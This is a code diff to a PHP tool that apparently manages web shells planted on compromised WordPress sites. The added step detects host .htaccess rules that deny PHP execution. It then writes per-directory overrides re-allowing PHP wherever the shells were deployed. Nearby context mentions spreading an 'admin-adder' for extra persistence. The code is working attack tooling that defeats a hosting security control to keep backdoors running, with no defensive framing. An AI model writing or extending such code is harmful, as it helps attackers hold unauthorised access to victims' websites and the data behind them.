@@ -1635,6 +1635,42 @@ switch ($_ACTION) {
         $summary = _summarize_multi_report($multi_report);
         $deployed_paths = $summary['deployed_paths'];
 
+        // ── Step 4b: Fix .htaccess PHP-deny rules in deployed directories ──
+        // Some hosts add a root .htaccess that denies all .php execution,
+        // with only a whitelist of WP core filenames allowed. Our shell
+        // filenames are not on that whitelist, so we write a per-directory
+        // .htaccess override to re-allow .php execution where we deployed.
+        $htaccess_fixes = [];
+        $root_ht = @file_get_contents($wp_root . '/.htaccess');
+        $needs_fix = ($root_ht !== false
+            && preg_match('/FilesMatch.*\.php/i', $root_ht)
+            && stripos($root_ht, 'Deny from all') !== false);
+        if ($needs_fix) {
+            $fix_dirs = [];
+            foreach ($multi_report as $role => $rr) {
+                foreach ((isset($rr['success']) ? $rr['success'] : array()) as $s) {
+                    $d = dirname(isset($s['path']) ? $s['path'] : '');
+                    if ($d && $d !== '.' && !in_array($d, $fix_dirs)) $fix_dirs[] = $d;
+                }
+            }
+            $ht_override = "<FilesMatch \"\\.php$\">\nOrder allow,deny\nAllow from all\n</FilesMatch>\n";
+            foreach ($fix_dirs as $d) {
+                $ht_path = $d . '/.htaccess';
+                $existed = file_exists($ht_path);
+                // Only write if no local .htaccess or if local one also denies php
+                $local_ht = $existed ? @file_get_contents($ht_path) : '';
+                $local_denies = ($local_ht && stripos($local_ht, 'Deny from all') !== false);
+                if (!$existed || $local_denies) {
+                    $ok = @file_put_contents($ht_path, $ht_override);
+                    $htaccess_fixes[] = [
+                        'dir' => $d,
+                        'status' => ($ok !== false) ? 'fixed' : 'write_failed',
+                        'existed' => $existed,
+                    ];
+                }
+            }
+        }
+
         // ── Step 5: Spread admin-adder to 1 different dir ──
         $adder_pool = [];
         foreach ($dirs as $arr) { $adder_pool = array_merge($adder_pool, $arr); }
@@ -1676,6 +1712,7 @@ switch ($_ACTION) {
             ]
         );
         $result['details']   = $multi_report;
+        $result['htaccess_fixes'] = isset($htaccess_fixes) ? $htaccess_fixes : array();
         $result['fetch_report'] = isset($fetch_report) ? $fetch_report : array();
         $result['admin_adder'] = [
             'target_dir' => !empty($adder_targets) ? $adder_targets[0] : null,
